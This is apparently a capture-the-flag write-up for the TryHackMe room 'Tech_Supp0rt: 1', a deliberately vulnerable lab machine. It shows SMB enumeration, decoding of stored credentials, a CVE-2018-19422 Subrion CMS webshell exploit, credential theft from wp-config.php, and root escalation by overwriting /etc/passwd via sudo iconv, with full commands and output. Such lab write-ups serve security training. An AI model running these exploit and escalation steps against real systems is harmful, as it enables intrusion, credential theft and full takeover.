| Category          | Details                                                                       |
|-------------------|-------------------------------------------------------------------------------|
| 📝 **Name**       | [Tech_Supp0rt: 1](https://tryhackme.com/room/techsupp0rt1)                    |  
| 🏷 **Type**       | THM Challenge                                                                 |
| 🖥 **OS**         | Linux                                                                         |
| 🎯 **Difficulty** | Easy                                                                          |
| 📁 **Tags**       | SMB, iptables, Subrion CMS v4.2.1, CVE-2018-19422, password reuse, sudo iconv |

## Task 1: Submit Flags

### What is the root.txt flag?

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Tech_Supp0rt: 1]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-18 18:59 +0100
Nmap scan report for 10.82.181.31
Host is up (0.045s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-18T18:00:46
|_  start_date: N/A
|_clock-skew: mean: -1h50m00s, deviation: 3h10m30s, median: -1s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2026-01-18T23:30:47+05:30

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.02 seconds
```

#### Enumerate Samba server
```
┌──(magicrc㉿perun)-[~/attack/THM Tech_Supp0rt: 1]
└─$ smbmap -u guest -p '' -H $TARGET --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.82.181.31:445        Name: 10.82.181.31              Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        websvr                                                  READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (TechSupport server (Samba, Ubuntu))
[*] Closed 1 connections
```

#### Enumerate `websvr` share
```
┌──(magicrc㉿perun)-[~/attack/THM Tech_Supp0rt: 1]
└─$ smbclient -U guest \\\\$TARGET\\websvr
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 29 09:17:38 2021
  ..                                  D        0  Sat May 29 09:03:47 2021
  enter.txt                           N      273  Sat May 29 09:17:38 2021

                8460484 blocks of size 1024. 5669204 blocks available
smb: \> get enter.txt 
getting file \enter.txt of size 273 as enter.txt (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)
```

#### Read exfiltrated `enter.txt` file
```
┌──(magicrc㉿perun)-[~/attack/THM Tech_Supp0rt: 1]
└─$ cat enter.txt
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, `/subrion` doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->
```
Since password is 'cooked with magical formula' we would need to decode / decrypt it.

#### Decode `admin` password
```
┌──(magicrc㉿perun)-[~/attack/THM Tech_Supp0rt: 1]
└─$ echo 7sKvntXdPEJaxazce9PXi24zaFrLiKWCk | base58 -d | base32 -d | base64 -d
Scam2021
```

#### Access `/subrion`
```
┌──(magicrc㉿perun)-[~/attack/THM Tech_Supp0rt: 1]
└─$ curl -v http://$TARGET/subrion/      
*   Trying 10.82.181.31:80...
* Connected to 10.82.181.31 (10.82.181.31) port 80
* using HTTP/1.x
> GET /subrion/ HTTP/1.1
> Host: 10.82.181.31
> User-Agent: curl/8.15.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 302 Found
< Date: Sun, 18 Jan 2026 18:55:24 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Set-Cookie: INTELLI_06c8042c3d=30jbem3ilvdmcpjekp8hqms8ic; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Set-Cookie: INTELLI_06c8042c3d=30jbem3ilvdmcpjekp8hqms8ic; expires=Sun, 18-Jan-2026 19:25:24 GMT; Max-Age=1800; path=/
< Location: http://10.0.2.15/subrion/subrion/
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host 10.82.181.31 left intact
```
As stated in `2)` of `enter.txt` this endpoint does not work, as we are being redirected to 'unknown' `10.0.2.15` address. This issue can be easily mitigated by redirecting local traffic destined for `10.0.2.15` to `$TARGET`.

#### Redirect local outbound traffic destined for `10.0.2.15` to target
```
┌──(magicrc㉿perun)-[~/attack/THM Tech_Supp0rt: 1]
└─$ sudo iptables -t nat -A OUTPUT -d 10.0.2.15 -j DNAT --to-destination $TARGET && \
sudo iptables -t nat -A POSTROUTING -d $TARGET -j MASQUERADE
```

#### Check Subrion CMS version running on target
```
┌──(magicrc㉿perun)-[~/attack/THM Tech_Supp0rt: 1]
└─$ curl -s -L http://$TARGET/subrion/panel | grep -o 'Subrion CMS v[0-9.]\+'
Subrion CMS v4.2.1
```
Subrion CMS v4.2.1 is vulnerable to [CVE-2018-19422](https://nvd.nist.gov/vuln/detail/CVE-2018-19422), which could be exploited to upload arbitrary PHP code.

#### Gain initial foothold by exploiting [CVE-2018-19422](https://nvd.nist.gov/vuln/detail/CVE-2018-19422)
```
┌──(magicrc㉿perun)-[~/attack/THM Tech_Supp0rt: 1]
└─$ git clone -q https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE &&
python3 CVE-2018-19422-SubrionCMS-RCE/SubrionRCE.py -u http://10.0.2.15/subrion/panel/ -l admin -p Scam2021
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://10.0.2.15/subrion/panel/
[+] Success!
[+] Got CSRF token: aqs9D2QdbQCzuSrLcwQOTnmmUsQejM8JcuuowiY5
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: odvmrogflrwldlx

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://10.0.2.15/subrion/panel/uploads/odvmrogflrwldlx.phar 

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### List users with shell access
```
$ cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
root:x:0:0:root:/root:/bin/bash
scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash
```

#### Get database password from WordPress configuration
```
$ grep DB_PASSWORD /var/www/html/wordpress/wp-config.php
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
```

#### Access target over SSH using `scamsite:ImAScammerLOL!123!` credentials
```
┌──(magicrc㉿perun)-[~/attack/THM Tech_Supp0rt: 1]
└─$ ssh scamsite@$TARGET
<SNIP>>
scamsite@TechSupport:~$ id
uid=1000(scamsite) gid=1000(scamsite) groups=1000(scamsite),113(sambashare)
```

#### List allowed sudo commands
```
scamsite@TechSupport:~$ sudo -l
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```

#### Use `sudo /usr/bin/iconv` to modify entry in `/etc/passwd`
```
scamsite@TechSupport:~$ \
sed 's|^scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash$|scamsite:x:0:0:scammer,,,:/home/scamsite:/bin/bash|' /etc/passwd | \
sudo iconv -f 8859_1 -t 8859_1 -o /etc/passwd
```

#### Re-login using `scamsite:ImAScammerLOL!123!` credentials
```
┌──(magicrc㉿perun)-[~/attack/THM Tech_Supp0rt: 1]
└─$ ssh scamsite@$TARGET
<SNIP>
root@TechSupport:~# id
uid=0(root) gid=0(root) groups=0(root),113(sambashare)
```

#### Capture root flag
```
root@TechSupport:~# cat /root/root.txt 
851b8233a8c09400ec30651bd1529bf1ed02790b
```
